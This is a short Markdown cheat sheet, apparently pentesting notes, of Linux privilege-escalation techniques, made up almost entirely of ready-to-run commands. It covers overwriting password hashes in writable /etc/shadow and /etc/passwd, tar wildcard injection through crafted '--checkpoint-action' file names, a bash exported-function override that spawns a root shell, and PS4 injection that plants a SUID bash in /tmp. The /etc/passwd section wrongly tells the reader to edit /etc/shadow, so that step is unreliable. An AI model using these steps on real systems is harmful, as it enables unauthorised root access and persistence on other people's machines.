# Linux Privilege Escalation

## Writable /etc/shadow

```bash
# Generate hash sha512crypt
mkpasswd -m sha-512 some-password-here

# Edit /etc/shadow and change hash
vim /etc/shadow
```

## Writable /etc/passwd

```bash
# Generate password for /etc/passwd
openssl passwd some-password-here

# Edit /etc/shadow and change hash
vim /etc/shadow
```

## Sudo escalation

```bash
# Check programs allowed
sudo -l
```

[https://gtfobins.github.io](https://gtfobins.github.io)

## Tar escalation

If some script is using some like: `tar czf file.tar.gz *`.

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

## Abusing Shell Features Functions

Bash `<4.2-048` you can define shell functions to overwrite paths.

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
./run/your/app
```

## Abusing Shell Features PS4 variable

Bash `<4.4` you can use environment variable PS4 to display extra prompt for debug.

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/super; chmod +xs /tmp/super)' /some/app/for/debug
/tmp/super -p
```